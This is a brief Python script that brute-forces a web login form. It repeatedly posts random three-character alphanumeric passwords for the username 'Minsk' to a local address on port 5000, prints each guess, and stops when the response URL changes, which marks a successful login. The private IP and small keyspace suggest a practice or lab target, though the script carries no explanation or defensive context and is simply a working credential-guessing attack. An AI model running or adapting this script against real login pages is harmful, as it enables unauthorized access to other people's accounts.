import requests
import random
import string
import requests

password = ""

payload = {"password": password, "username": "Minsk"}
url = "http://192.168.0.125:5000/"

lista_password = [""]
r = requests.post(url, payload)

#while int(r.status_code) != 302:
while True:
#while password in lista_password:
    #password = "".join(random.choice(string.ascii_letters + string.digits) for _ in range(2))
#lista_password.append(password)
    password = "".join(random.choice(string.ascii_letters + string.digits) for _ in range(3))
    payload["password"] = password
    r = requests.post(url, payload)
    print(password)
    print(r.status_code)
    print(r.url)
    if r.url != url:
        break;
print(r.text)
    #get = requests.get(url)
    #get = get.status_code
    #print(get.text)
    #print(get)

    